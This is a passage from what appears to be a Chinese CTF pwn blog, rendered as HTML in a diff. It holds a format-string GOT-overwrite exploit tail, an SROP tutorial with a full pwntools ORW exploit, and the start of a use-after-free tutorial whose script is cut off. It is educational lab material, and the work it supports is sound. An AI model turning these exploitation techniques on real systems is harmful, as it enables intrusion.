fmtstr.encode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">def fmt_str(offset, size, addr, target):</span><br><span class="line">    # offset 偏移位置  size 32?64  addr写入地址   target 写入内容</span><br><span class="line">    payload = b&quot;&quot;</span><br><span class="line">    for i in range(4):</span><br><span class="line">        if size == 4:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        else:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = len(payload)</span><br><span class="line">    for i in range(4):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * 8) &amp; 0xff</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">    #context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">    pwnfile = &#x27;./fmt_str_level_1_x86&#x27;</span><br><span class="line">    elf = ELF(pwnfile)</span><br><span class="line">    libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line"></span><br><span class="line">   # gdb.attach(io)</span><br><span class="line">    payload1 = b&#x27;%75$p&#x27;</span><br><span class="line">    io.send(payload1)</span><br><span class="line">    io.recvuntil(&quot;input:\n&quot;)</span><br><span class="line">    main_p30_addr = int(io.recv(10)[2 : 10] , 16 )</span><br><span class="line">    main_addr = main_p30_addr - 30</span><br><span class="line">    print(&quot;main_addr:&quot; , hex(main_addr))</span><br><span class="line">    offset = elf.symbols[&#x27;main&#x27;] - elf.got[&#x27;printf&#x27;]</span><br><span class="line"></span><br><span class="line">    printf_got_addr = main_addr - offset</span><br><span class="line">    print(&quot;printf_got_addr:&quot; , hex(printf_got_addr))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(&quot;input:\n&quot;)</span><br><span class="line">    payload2 = p32(printf_got_addr) + b&#x27;%7$s\x00&#x27;</span><br><span class="line">    io.send(payload2)</span><br><span class="line"></span><br><span class="line">    print_real_addr = u32(io.recv(8)[ 4 : 8])</span><br><span class="line">    print(&quot;print_real_addr:&quot; , hex(print_real_addr))</span><br><span class="line"></span><br><span class="line">    libcbase = print_real_addr - libc.sym[&quot;printf&quot;]</span><br><span class="line">    sys_addr = libcbase + libc.sym[&quot;system&quot;]</span><br><span class="line">    binsh_addr = libcbase + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">    print(&quot;sys_addr:&quot; , hex(sys_addr))</span><br><span class="line">    print(&quot;binshi_addr:&quot; , hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(&quot;input:\n&quot;)</span><br><span class="line">    payload3 = fmt_str( 7 , 4 , printf_got_addr , sys_addr)</span><br><span class="line">    print( &quot;payload3:&quot; , payload3)</span><br><span class="line">    io.send(payload3)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(&quot;input:\n&quot;)</span><br><span class="line">    payload4 = p32(binsh_addr)</span><br><span class="line">    io.send(payload4)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://wwyq.lanzouo.com/ip6Km2g06pdi" title="题目附件">题目附件</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/17/SROP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Fa1lSnow">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/06/17/SROP/" class="post-title-link" itemprop="url">SROP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-06-17 13:04:54 / Modified: 13:11:43" itemprop="dateCreated datePublished" datetime="2025-06-17T13:04:54+08:00">2025-06-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <meta name="referrer" content="no-referrer" />
+
+<h1 id="高级ROP之SROP"><a href="#高级ROP之SROP" class="headerlink" title="高级ROP之SROP"></a>高级ROP之SROP</h1><h2 id="一、知识储备"><a href="#一、知识储备" class="headerlink" title="一、知识储备"></a>一、知识储备</h2><h3 id="1-signal-机制"><a href="#1-signal-机制" class="headerlink" title="1. signal 机制"></a>1. signal 机制</h3><blockquote>
+<p>这里基础知识就搬运ctfwiki上的了。</p>
+</blockquote>
+<p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130109186.png" alt="image"><br>基本步骤如下：</p>
+<ol>
+<li>内核向某个进程发送<strong>signal</strong>信号，该进程会被暂时<strong>挂起</strong>，进入内核态。</li>
+<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。</strong> 此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，<strong>这一部分是在用户进程的地址空间的。</strong> 之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130109320.png" alt="image"></li>
+<li>signal handler 返回后，**内核为执行 sigreturn 系统调用，<strong>为该进程</strong>恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。**其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</li>
+</ol>
+<p>简单来说就是：先保存各个寄存器中的值（Signal Frame），然后挂起用户进程，然后执行信号处理函数，处理完之后恢复栈和各个寄存器让后继续执行用户进程。</p>
+<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>可以注意到：<strong>Signal Frame是保存在用户空间上的，对用户来说是可读可写的</strong>，而且<strong>内核与信号处理程序没有直接关联</strong> ，它并不会去记录每个 signal 所对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。也就是说，我们可以<strong>通过伪造 Signal Frame来控制各个寄存器的值</strong>以此来达到攻击的目的。<br>比如说：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax = 0x3B（execve）</span><br><span class="line">rdi=&#x27;/bin/sh\00&#x27;</span><br><span class="line">rsi=0x0</span><br><span class="line">rdx=0x0</span><br><span class="line">rip=syscall</span><br></pre></td></tr></table></figure>
+<p>这样就可以成功getshell。</p>
+<blockquote>
+<p>Signal Frame看起来十分庞大，但是使用pwntools可以快捷构造我们所需要的Signal Frame</p>
+</blockquote>
+<h2 id="二、例题分析"><a href="#二、例题分析" class="headerlink" title="二、例题分析"></a>二、例题分析</h2><blockquote>
+<p>附件放在文末</p>
+</blockquote>
+<p>拿到题还是先检查一下保护信息，然后运行一下看看。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130109198.png" alt="image"><br>ida分析<br><code>main（）</code><br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130109170.png" alt="image"><br><code>rt_sigreturn（)</code><br><img src="https://img2024.cnblogs.com/blog/3558929/202412/3558929-20241201160614843-2066201976.png" alt="image"><br>禁用了execve和execveat这两个系统调用，意味着我们很难getshell，所以使用ORW的方式来读取flag。这道题还有现成的sigreturn。<br>要实现ORW，我们就要构造SROP链。我们先通过一个sigreturn把栈迁移到已知段，这个段要足够长，足以放下Signal Frame，所以.bss段就是一个很好的选择。<br>首先我们做一些准备工作，通过ida静态调试，我们拿到了 sigreturn 的地址：<code>sigreturn_sddr = 0x401296</code>、syscall_ret的地址<code>syscall_addr = 0x40129D</code>和bss段的起始地址：<code>0x404060</code>，为了防止我们的操作更改了bss段比较重要的一些进程的数据，我们给这个地址加上一段偏移再使用：<code>bss_addr = 0x404060 + 0x300</code>。<br>然后我们执行栈迁移和第二次read操作，通过IDA的数据可知，我们们需要填充0x28个字节的垃圾数据，所以payload1如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">frame1 = SigreturnFrame()</span><br><span class="line">frame1.rip = syscall_addr</span><br><span class="line">frame1.rbp = bss_addr + <span class="number">0x8</span></span><br><span class="line">frame1.rsp = bss_addr + <span class="number">0x8</span></span><br><span class="line">frame1.rax = constants.SYS_read</span><br><span class="line">frame1.rdi = <span class="number">0</span></span><br><span class="line">frame1.rsi = bss_addr</span><br><span class="line">frame1.rdx = <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*padding + p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame1))</span><br><span class="line">p.sendline(payload1)</span><br></pre></td></tr></table></figure>
+<p>部分解释：bss_addr + 0x8是因为后面我们需要传入‘flag\x00\x00\x00\x00’<br>下一步我们要进行orw操作<br>先构造open部分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame2 = SigreturnFrame()</span><br><span class="line">frame2.rip = syscall_addr</span><br><span class="line">frame2.rbp = bss_addr + <span class="number">0x8</span> + <span class="number">0x100</span></span><br><span class="line">frame2.rsp = bss_addr + <span class="number">0x8</span> + <span class="number">0x100</span></span><br><span class="line">frame2.rax = constants.SYS_open</span><br><span class="line">frame2.rdi = bss_addr</span><br><span class="line">frame2.rsi = <span class="number">0x0</span></span><br><span class="line">frame2.rdx = <span class="number">0x0</span></span><br><span class="line">payload2 = <span class="string">b&#x27;flag&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x4</span> + p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame2))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后是read部分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame3 = SigreturnFrame()</span><br><span class="line">frame3.rip = syscall_addr</span><br><span class="line">frame3.rbp = bss_addr + <span class="number">0x8</span> + <span class="number">0x208</span></span><br><span class="line">frame3.rsp = bss_addr + <span class="number">0x8</span> + <span class="number">0x200</span></span><br><span class="line">frame3.rax = constants.SYS_read</span><br><span class="line">frame3.rdi = <span class="number">0x3</span></span><br><span class="line">frame3.rsi = bss_addr</span><br><span class="line">frame3.rdx = <span class="number">0x30</span></span><br><span class="line">payload3 =  p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame3))</span><br></pre></td></tr></table></figure>
+<p>最后是write部分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frame4 = SigreturnFrame()</span><br><span class="line">frame4.rip = syscall_addr</span><br><span class="line">frame4.rax = constants.SYS_write</span><br><span class="line">frame4.rdi = <span class="number">0x1</span></span><br><span class="line">frame4.rsi = bss_addr</span><br><span class="line">frame4.rdx = <span class="number">0x30</span></span><br><span class="line">payload4 =  p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame4))</span><br></pre></td></tr></table></figure>
+<p>所以总的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">frame2 = SigreturnFrame()</span><br><span class="line">frame2.rip = syscall_addr</span><br><span class="line">frame2.rbp = bss_addr + <span class="number">0x8</span> + <span class="number">0x100</span></span><br><span class="line">frame2.rsp = bss_addr + <span class="number">0x8</span> + <span class="number">0x100</span></span><br><span class="line">frame2.rax = constants.SYS_open</span><br><span class="line">frame2.rdi = bss_addr</span><br><span class="line">frame2.rsi = <span class="number">0x0</span></span><br><span class="line">frame2.rdx = <span class="number">0x0</span></span><br><span class="line">payload2 = <span class="string">b&#x27;flag&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x4</span> + p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame2))</span><br><span class="line"></span><br><span class="line">frame3 = SigreturnFrame()</span><br><span class="line">frame3.rip = syscall_addr</span><br><span class="line">frame3.rbp = bss_addr + <span class="number">0x8</span> + <span class="number">0x208</span></span><br><span class="line">frame3.rsp = bss_addr + <span class="number">0x8</span> + <span class="number">0x200</span></span><br><span class="line">frame3.rax = constants.SYS_read</span><br><span class="line">frame3.rdi = <span class="number">0x3</span></span><br><span class="line">frame3.rsi = bss_addr</span><br><span class="line">frame3.rdx = <span class="number">0x30</span></span><br><span class="line">payload3 =  p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame3))</span><br><span class="line"></span><br><span class="line">frame4 = SigreturnFrame()</span><br><span class="line">frame4.rip = syscall_addr</span><br><span class="line">frame4.rax = constants.SYS_write</span><br><span class="line">frame4.rdi = <span class="number">0x1</span></span><br><span class="line">frame4.rsi = bss_addr</span><br><span class="line">frame4.rdx = <span class="number">0x30</span></span><br><span class="line">payload4 =  p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame4))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload2 + payload3 + payload4)</span><br></pre></td></tr></table></figure>
+<p>所以总的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    elf=ELF(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line">    p = process(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    padding = <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">    bss_addr = <span class="number">0x404060</span> + <span class="number">0x300</span></span><br><span class="line">    sigreturn_sddr = <span class="number">0x401296</span></span><br><span class="line">    syscall_addr = <span class="number">0x40129D</span></span><br><span class="line"></span><br><span class="line">    frame1 = SigreturnFrame()</span><br><span class="line">    frame1.rip = syscall_addr</span><br><span class="line">    frame1.rbp = bss_addr + <span class="number">0x8</span></span><br><span class="line">    frame1.rsp = bss_addr + <span class="number">0x8</span></span><br><span class="line">    frame1.rax = constants.SYS_read</span><br><span class="line">    frame1.rdi = <span class="number">0</span></span><br><span class="line">    frame1.rsi = bss_addr</span><br><span class="line">    frame1.rdx = <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">    payload1 = <span class="string">b&#x27;A&#x27;</span>*padding + p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame1))</span><br><span class="line">    p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">    frame2 = SigreturnFrame()</span><br><span class="line">    frame2.rip = syscall_addr</span><br><span class="line">    frame2.rbp = bss_addr + <span class="number">0x8</span> + <span class="number">0x100</span></span><br><span class="line">    frame2.rsp = bss_addr + <span class="number">0x8</span> + <span class="number">0x100</span></span><br><span class="line">    frame2.rax = constants.SYS_open</span><br><span class="line">    frame2.rdi = bss_addr</span><br><span class="line">    frame2.rsi = <span class="number">0x0</span></span><br><span class="line">    frame2.rdx = <span class="number">0x0</span></span><br><span class="line">    payload2 = <span class="string">b&#x27;flag&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x4</span> + p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame2))</span><br><span class="line"></span><br><span class="line">    frame3 = SigreturnFrame()</span><br><span class="line">    frame3.rip = syscall_addr</span><br><span class="line">    frame3.rbp = bss_addr + <span class="number">0x8</span> + <span class="number">0x208</span></span><br><span class="line">    frame3.rsp = bss_addr + <span class="number">0x8</span> + <span class="number">0x200</span></span><br><span class="line">    frame3.rax = constants.SYS_read</span><br><span class="line">    frame3.rdi = <span class="number">0x3</span></span><br><span class="line">    frame3.rsi = bss_addr</span><br><span class="line">    frame3.rdx = <span class="number">0x30</span></span><br><span class="line">    payload3 =  p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame3))</span><br><span class="line"></span><br><span class="line">    frame4 = SigreturnFrame()</span><br><span class="line">    frame4.rip = syscall_addr</span><br><span class="line">    frame4.rax = constants.SYS_write</span><br><span class="line">    frame4.rdi = <span class="number">0x1</span></span><br><span class="line">    frame4.rsi = bss_addr</span><br><span class="line">    frame4.rdx = <span class="number">0x30</span></span><br><span class="line">    payload4 =  p64(sigreturn_sddr) + (<span class="built_in">bytes</span>(frame4))</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    p.send(payload2 + payload3 + payload4)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://wwyq.lanzouo.com/iowRJ2gu36tc" title="附件">附件</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/17/UAF%E5%88%9D%E8%AF%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Fa1lSnow">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/06/17/UAF%E5%88%9D%E8%AF%86/" class="post-title-link" itemprop="url">UAF初识</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-06-17 13:04:54 / Modified: 13:11:53" itemprop="dateCreated datePublished" datetime="2025-06-17T13:04:54+08:00">2025-06-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <meta name="referrer" content="no-referrer" />
+
+<h1 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>UAF —— Use After Free：其内容如同其名称，free后进行再利用。UAF是堆结构漏洞的一种重要的利用方式。<br>在程序中，UAF常有以下几种情况：</p>
+<ul>
+<li>内存块被释放后，其对应的指针被设置为 NULL，然后再次使用，自然程序会崩溃。</li>
+<li>内存块被释放后，其对应的指针<strong>没有被设置为 NULL</strong> ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
+<li>内存块被释放后，其对应的指针<strong>没有被设置为 NULL</strong>，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。<br>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。<blockquote>
+<p>Dangling Pointer（悬挂指针、悬空指针、迷途指针）是计算机编程中的一个常见且危险的问题，它指的是一个指针仍然保留着之前指向的内存地址，但是这片内存区域可能已经被释放或者不再有效，从而可能导致程序在使用该指针时出现未定义行为。</p>
+</blockquote>
+</li>
+</ul>
+<p>下面我将通过一道简单的例题展示一下UAF的攻击。</p>
+<h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><blockquote>
+<p>题目来源：actf_2019_babyheap（UAF）</p>
+</blockquote>
+<p>拿到题先检查保护信息，然后运行一下。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909010.png" alt="image"><br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909023.png" alt="image"><br>这是一道菜单题，没有开启PIE。<br>然后用ida反编译一下，定位到 main函数。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125933334.png" alt="image-20250617125933275"><br>经过我们的逆向之后，代码是这个样子的。<br>main函数：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125908994.png" alt="image"><br>menu函数：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909026.png" alt="image"><br>可以看到该函数调用了system函数，我们再检索一下字符串，发现了<code>/bin/sh</code>。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909051.png" alt="image"><br>由于这道题没有开启PIE，所以<code>system</code>函数的地址和<code>/bin/sh</code>的地址我们就取得了，后续可能会有用。<br>creat:<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909868.png" alt="image"><br>creat函数先是malloc了一个0x10大小的堆块，然后<strong>把用户malloc的堆块的地址和print_context的地址</strong>存入该堆块。<br>print_content：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909903.png" alt="image"><br>delete：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909995.png" alt="image"><br>可见delete函数中再free掉堆块之后并没有将指针设置为NULL，说明程序中可能存在UAF漏洞。<br>show：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125910149.png" alt="image"><br>可以看到，show函数是通过调用函数指针来输出数据的，而这个函数的地址储存在<strong>ptr[index][2]处</strong>，参数储存在<strong>ptr[index][1]处</strong>。<br>那么思路就十分明确了。我们可以先创造2个任意大小的堆块（远离0x10即可），然后free掉他们。然后再创建一个0x10（或者0x18）大小的堆块，通过修堆块的内容为<code>binsh_addr</code>和<code>system_addr</code>然后再执行show(0)就可以了。说的可能有点晦涩难懂，以下是具体解释。<br>在我们申请两个堆块之后，大致情况如下。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125910148.png" alt="image"><br>然后我们再把这两个堆块free掉，再次申请0x10（0x18）大小的堆块。<br>此时由于堆管理机制，我们申请得到的<strong>struct3就是原来的struct2，content的堆块就是原来的struct1</strong>（后入先出），这样我们就可以把原来的content地址改为binsh的地址，print_content的地址改为system的地址，然后再show(0)就能够getshell（struct1的index为0)。<br>那么具体的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please input size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please input list index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please input list index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context(log_level=<span class="string">&#x27;debug&#x27;</span> , os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    pwnfile = <span class="string">&#x27;./uaf&#x27;</span></span><br><span class="line">    p = 